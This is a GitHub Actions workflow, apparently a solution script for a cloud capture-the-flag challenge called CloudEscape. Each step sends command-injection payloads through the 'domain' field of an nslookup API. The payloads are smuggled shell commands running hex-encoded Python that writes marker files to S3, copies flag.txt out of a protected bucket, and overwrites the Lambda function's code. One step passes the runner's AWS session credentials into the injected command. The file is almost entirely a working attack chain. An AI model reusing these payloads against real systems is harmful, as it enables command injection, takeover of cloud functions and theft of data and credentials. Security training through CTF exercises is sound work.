name: CloudEscape - Get Indication
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Recon - CloudWatch logs accessible?
        run: |
          echo "===== Log groups ====="
          aws logs describe-log-groups --region us-east-1 2>&1 | head -30
          
          echo "===== Lambda log streams ====="
          aws logs describe-log-streams --log-group-name /aws/lambda/nslookupv2 --region us-east-1 --order-by LastEventTime --descending --max-items 3 2>&1 | head -30

      - name: Test1 - Write INDICATION via printf-hex python3
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          PAYLOAD=$(python3 << 'PYEOF'
          import json
          s = "import boto3;c=boto3.client('s3',region_name='us-east-1');c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='INDICATION.txt',Body=b'INJECTION_WORKS')"
          h = ''.join(f'\\x{ord(c):02x}' for c in s)
          cmd = f'127.0.0.1; printf "{h}" > /tmp/i.py; /var/lang/bin/python3 /tmp/i.py 2>&1'
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test2 - Read flag via printf-hex python3
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          PAYLOAD=$(python3 << 'PYEOF'
          import json
          s = "import boto3,traceback\n"
          s += "c=boto3.client('s3',region_name='us-east-1')\n"
          s += "try:\n"
          s += "    r=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')\n"
          s += "    f=r['Body'].read()\n"
          s += "    c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)\n"
          s += "except Exception as ex:\n"
          s += "    c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='error.txt',Body=str(ex).encode())\n"
          h = ''.join(f'\\x{ord(c):02x}' for c in s)
          cmd = f'127.0.0.1; printf "{h}" > /tmp/g.py; /var/lang/bin/python3 /tmp/g.py 2>&1'
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test3 - Update Lambda code (Lambda own role, printf-hex)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          export NEW_CODE="import subprocess\nimport logging\nimport boto3\n\nlogger=logging.getLogger()\nlogger.setLevel(logging.INFO)\n\ndef lambda_handler(event,context):\n    try:\n        s3=boto3.client('s3',region_name='us-east-1')\n        r=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')\n        flag=r['Body'].read().decode().strip()\n        return{'statusCode':200,'body':{'flag':flag}}\n    except Exception as e:\n        return{'statusCode':200,'body':{'error':str(e)[:200]}}\n"
          PAYLOAD=$(python3 << 'PYEOF'
          import json, os, zipfile, io, base64
          new_code = os.environ.get('NEW_CODE', '')
          buf = io.BytesIO()
          with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
              zf.writestr('lambda_function.py', new_code)
          zip_b64 = base64.b64encode(buf.getvalue()).decode()
          s = "import boto3,base64\n"
          s += "z=base64.b64decode('" + zip_b64 + "')\n"
          s += "c=boto3.client('lambda',region_name='us-east-1')\n"
          s += "c.update_function_code(FunctionName='nslookupv2',ZipFile=z)\n"
          h = ''.join(f'\\x{ord(c):02x}' for c in s)
          cmd = f'127.0.0.1; printf "{h}" > /tmp/u.py; /var/lang/bin/python3 /tmp/u.py 2>&1'
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 15
          echo "=== API call ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1
          echo
          sleep 5
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1

      - name: Test4 - Update Lambda code with cicdRole creds (printf-hex)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          export AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
          export SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
          export TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
          export NEW_CODE="import subprocess\nimport logging\nimport boto3\n\nlogger=logging.getLogger()\nlogger.setLevel(logging.INFO)\n\ndef lambda_handler(event,context):\n    try:\n        s3=boto3.client('s3',region_name='us-east-1')\n        r=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')\n        flag=r['Body'].read().decode().strip()\n        return{'statusCode':200,'body':{'flag':flag}}\n    except Exception as e:\n        return{'statusCode':200,'body':{'error':str(e)[:200]}}\n"
          PAYLOAD=$(python3 << 'PYEOF'
          import json, os, zipfile, io, base64
          new_code = os.environ.get('NEW_CODE', '')
          akid_b64 = os.environ['AKID_B64']
          skid_b64 = os.environ['SKID_B64']
          token_b64 = os.environ['TOKEN_B64']
          buf = io.BytesIO()
          with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
              zf.writestr('lambda_function.py', new_code)
          zip_b64 = base64.b64encode(buf.getvalue()).decode()
          s = "import boto3,base64,os\n"
          s += "a=base64.b64decode(os.environ['A']).decode()\n"
          s += "s=base64.b64decode(os.environ['S']).decode()\n"
          s += "t=base64.b64decode(os.environ['T']).decode()\n"
          s += "se=boto3.Session(aws_access_key_id=a,aws_secret_access_key=s,aws_session_token=t,region_name='us-east-1')\n"
          s += "z=base64.b64decode('" + zip_b64 + "')\n"
          s += "c=se.client('lambda')\n"
          s += "c.update_function_code(FunctionName='nslookupv2',ZipFile=z)\n"
          h = ''.join(f'\\x{ord(c):02x}' for c in s)
          cmd = f"127.0.0.1; export A={akid_b64} S={skid_b64} T={token_b64}; printf \"{h}\" > /tmp/u.py; /var/lang/bin/python3 /tmp/u.py 2>&1"
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 15
          echo "=== API call ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1
          echo
          sleep 5
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1

      - name: Test5 - Ultra simple aws s3 cp
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          PAYLOAD='{"domain": "127.0.0.1; echo INDICATION > /tmp/i; /opt/bin/aws s3 cp /tmp/i s3://platform-bucket-009661764077-us-east-1/INDICATION.txt --region us-east-1"}'
          echo "Payload: $PAYLOAD"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Final - Check ALL indication channels
        if: always()
        run: |
          echo "===== 1. Platform bucket ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
          
          echo "===== 2. Lambda Description ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
          
          echo "===== 3. Lambda Environment ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Environment' 2>&1
          
          echo "===== 4. API response (did code change?) ====="
          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1
          echo
          
          echo "===== 5. CloudWatch logs ====="
          STREAM=$(aws logs describe-log-streams --log-group-name /aws/lambda/nslookupv2 --region us-east-1 --order-by LastEventTime --descending --max-items 1 --query 'logStreams[0].logStreamName' --output text 2>&1)
          echo "Stream: $STREAM"
          aws logs get-log-events --log-group-name /aws/lambda/nslookupv2 --log-stream-name "$STREAM" --region us-east-1 --limit 20 2>&1 || true
          
          echo "===== 6. Codec bucket ====="
          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1
          
          echo "===== 7. Site bucket ====="
          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1